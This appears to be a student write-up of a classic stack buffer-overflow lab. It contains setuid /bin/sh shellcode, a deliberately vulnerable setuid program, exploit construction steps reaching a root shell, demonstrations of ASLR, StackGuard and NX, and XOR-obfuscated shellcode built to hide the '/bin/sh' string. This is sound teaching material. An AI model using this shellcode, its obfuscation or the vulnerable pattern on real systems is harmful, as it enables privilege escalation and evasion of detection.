# Assignment 1 - Buffer Overflow

## Initial setup
```
$ sudo sysctl -w kernel.randomize_va_space=0
$ sudo apt-get install execstack
```

## Shellcode Example
call_shellcode.c
```
/* call_shellcode.c */

/* A program that executes a shellcode for launching a shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
	"\x6a\x17"			/* push $0x17 */
	"\x58"				  /* pop %eax */
	"\x31\xdb"			/* xor %ebx, %ebx */
	"\xcd\x80"			/* int $0x80 */
	"\x31\xc0"			/* Line 1: xorl %eax,%eax */
	"\x50"				  /* Line 2: pushl %eax */
	"\x68""//sh"		/* Line 3: pushl $0x68732f2f */
	"\x68""/bin"		/* Line 4: pushl $0x6e69622f */
	"\x89\xe3"			/* Line 5: movl %esp,%ebx */
	"\x50"				  /* Line 6: pushl %eax */
	"\x53"				  /* Line 7: pushl %ebx */
	"\x89\xe1"			/* Line 8: movl %esp,%ecx */
	"\x99"				  /* Line 9: cdql */
	"\xb0\x0b"			/* Line 10: movb $0x0b,%al */
	"\xcd\x80"			/* Line 11: int $0x80 */
;

int main(int argc, char **argv)
{
	char buf[sizeof(code)];
	strcpy(buf, code);
	((void(*)( ))buf)( );
}
```
```
$ gcc -o call_shellcode call_shellcode.c
$ execstack -s call_shellcode
$ ./call_shellcode
```

## Vulnerable program
stack.c
```
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
	char buffer[12];

	/* The following statement has a buffer overflow problem */
	strcpy(buffer, str);

	return 1;
}

int main(int argc, char **argv)
{
	char str[517];
	FILE *badfile;

	badfile = fopen("badfile", "r");
	fread(str, sizeof(char), 517, badfile);
	bof(str);
	printf("Returned Properly\n");
	return 1;
}
```
```
$ sudo gcc -g -o stack -fno-stack-protector stack.c
$ sudo chmod 4755 stack
$ sudo execstack -s stack
```

## Exploit skeleton
exploit.c
```
/* exploit.c */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
	// setuid(0)
	"\x6a\x17"			/* push $0x17 */
	"\x58"				  /* pop %eax */
	"\x31\xdb"			/* xor %ebx, %ebx */
	"\xcd\x80"			/* int $0x80 */
	"\x31\xc0"			/* xorl %eax,%eax */
	"\x50"				  /* pushl %eax */
	"\x68""//sh"		/* pushl $0x68732f2f */
	"\x68""/bin"		/* pushl $0x6e69622f */
	"\x89\xe3"			/* movl %esp,%ebx */
	"\x50"				  /* pushl %eax */
	"\x53"				  /* pushl %ebx */
	"\x89\xe1"			/* movl %esp,%ecx */
	"\x99"				  /* cdql */
	"\xb0\x0b"			/* movb $0x0b,%al */
	"\xcd\x80"			/* int $0x80 */
;

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);

	/* You need to fill the buffer with appropriate contents here */
	/* ... */

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
```
## Target result
```
$ gcc -o exploit exploit.c
$ ./exploit 			// create the badfile
$ ./stack badfile		// launch the attack by running the vulnerable program
# <---- Bingo! You’ve got a root shell!
```

## Task 1: Exploiting the Vulnerability

The vulnerable function strcpy will copy the contents into the buffer without checking for the size of the buffer. Thus, an attacker can overwrite the buffer, base pointer, return address and higher memory addresses. The attacker should craft the exploit program is such a way to overwrite the return address, place a no-op sled above it and the shellcode above the no-op sled. The return address must be overwritten to point to the shellcode or any no-op instruction.


### Finding the correct addresses
To successfully mount the buffer overflow attack, we need to find:

* Starting address of the buffer:
  - `gdb ./stack` to start the debugger
  -	`break 16` to set a breakpoint at line 16 (just before returning from `bof()`)
  - The buffer address should be printed (line 15 in exploit.c helps achieve that) – `0xbffffbb4`
  - `info registers` to find the memory address of esp and examining the top of the stack to verify the memory address of the no-op sled.


* Address of the saved return address
  - Using `info registers`, we find that the $ebp is at `0xbffffbc8`. Thus, the return address will at `0xbffffbcc` ($esp + 4 bytes).
  - Using `disassemble 0xbffffbcc`, we get a dump that confirms that we return to the main function.
  - Thus, the location of the return address is 24 bytes after the address of the buffer.


* Target address
  - The target address can be anywhere after the return address. This will make the target address point to a no-op sled that will eventually lead the execution to the shellcode.


### Getting the shell

```
$ gcc -o exploit exploit.c
$ ./exploit
$ ./stack
#
# whoami
# root
```



## Task 2: Address Randomization

### Explanation of address randomization
Address randomization is a security technique that that aims to prevent memory corruption by randomizing addresses that are targeted by attackers. Every time a program is run, the components of the program (stack, heap and libraries) are moved to a different address in the virtual memory to minimize the attacker’s chances of guessing the correct address, thus making it difficult to mount a buffer overflow attack.

```
$ sudo sysctl -w kernel.randomize_va_space=2
$ ./exploit
$ ./stack
Segmentation fault (core dumped)
```

## Task 3: Stack Guard

### Explanation of the mechanism of Stack Guard protector
StackGuard aims to detect and defeat stack smashing attacks by protecting the return address on the stack from being altered - it achieves this by placing a canary below the return address on the stack. The canary is generated when the function is called and its value is checked before exiting the function. If the program detects that the canary is compromised, it will set a flag that the stack is smashed. Different types of canaries are available - Terminator canary, Random canary, Null canary.

```
$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
$ sudo gcc -g -o stack stack.c
$ sudo chmod 4755 stack
$ sudo execstack -s stack
$ ./stack badfile
*** stack smashing detected ***: ./stack terminated
Segmentation fault (core dumped)
```


## Task 4: Non-executable stack

###	Explanation of the non-executable stack mechanism
	To prevent certain buffer-overflow attacks, virtual address space can be marked
non-executable (using the NX bit - no execute bit) - thus rendering the stack non-executable. This would prevent any attack code that is injected into the stack from being executed.

```
$ sudo gcc -g -o stack -fno-stack-protector stack.c
$ sudo chmod 4755 stack
$ sudo execstack -c stack
$ ./stack badfile
Segmentation fault (core dumped)
```

## Task 5: Shellcode obfuscation

### Explain different ways of constructing a shellcode that launches a shell
We can break up the string "/bin/sh" into two values such that when the values are xored during execution, they will return the intended "//sh" and "/bin" strings. This way, the string "/bin/sh" is not hardcoded into the shellcode array.

### Write an obfuscated shellcode that does not contain "bin/sh" string
You will need to also explain how you generate the shellcode and the logic behind it.

To carry out the idea described in 5.1, I first converted the shellcode into assembly code:

```
mov ecx, 0x78563412		; put randomly selected value into ecx
mov ebx, 0x10251b3d		; put a value into ebx, that will give us 68732f2f when xored with ecx. 68732f2f is our "//sh"
xor ebx, ecx			    ; xor ecx and ebx, to give us 68732f2f in ebx
push ebx				      ; push ebx(68732f2f) onto the stack

mov ebx, 0x163f563d		; put a value into ebx, that will give us 6e69622f when xored with ecx. 6e69622f is our "/bin"
xor ebx, ecx			    ; xor ecx and ebx, to give us 6e69622f in ebx
push ebx				      ; push ebx(6e69622f) onto the stack
```

Next, I converted the assembly code into hex opcodes using an assembler. The result is:

```
"\xb9\x12\x34\x56\x78"		/* mov ecx, 0x78563412 */
"\xbb\x3d\x1b\x25\x10"		/* mov ebx, 0x10251b3d */
"\x31\xcb"					      /* xor ebx, ecx */
"\x53"						        /* push ebx */
"\xbb\x3d\x56\x3f\x16"		/* mov ebx, 0x163f563d */
"\x31\xcb"					      /* xor ebx, ecx */
"\x53"						        /* push ebx */
```

Finally, we replace the hardcoded "/bin/sh" in the shellcode to use our newly generated obfuscated string.

```
"\x68""//sh"				     /* pushl $0x68732f2f */
"\x68""/bin"				     /* pushl $0x6e69622f */
```

is replaced with the newly generated hex opcodes.


## Output
```
$ sudo execstack -s stack
$ gcc -o exploit_obfuscated exploit_obfuscated.c
$ ./exploit_obfuscated
$ ./stack
#   
# whoami
root
```
